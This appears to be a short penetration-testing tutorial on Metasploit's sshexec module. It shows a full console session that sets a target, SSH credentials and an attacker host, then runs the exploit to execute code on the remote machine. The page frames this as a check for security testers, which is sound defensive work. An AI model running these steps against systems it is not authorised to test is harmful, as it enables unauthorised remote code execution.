# ðŸŸ¢ SSH User Code Execution

SSH User Code Execution, often referred to as `sshexec`, is a type of penetration testing exploit that allows an attacker to execute commands on a remote machine via SSH. This technique leverages legitimate SSH credentials to gain access to a system and run arbitrary code.

In Metasploit, this can be accomplished using the `exploit/multi/ssh/sshexec` module. Below is a step-by-step example:

```
msf > use exploit/multi/ssh/sshexec
msf exploit(sshexec) >set rhosts 192.168.1.103
msf exploit(sshexec) >set username ignite
msf exploit(sshexec) >set password 123
msf exploit(sshexec) >set srvhost 192.168.1.107
msf exploit(sshexec) >exploit
```

Here, `rhosts` specifies the target host, `username` and `password` provide the SSH credentials, and `srvhost` is your attacking machine. The `exploit` command then executes the attack.

This method is useful for security testers to assess the vulnerabilities of SSH-enabled systems by validating if password-based authentication can be exploited.
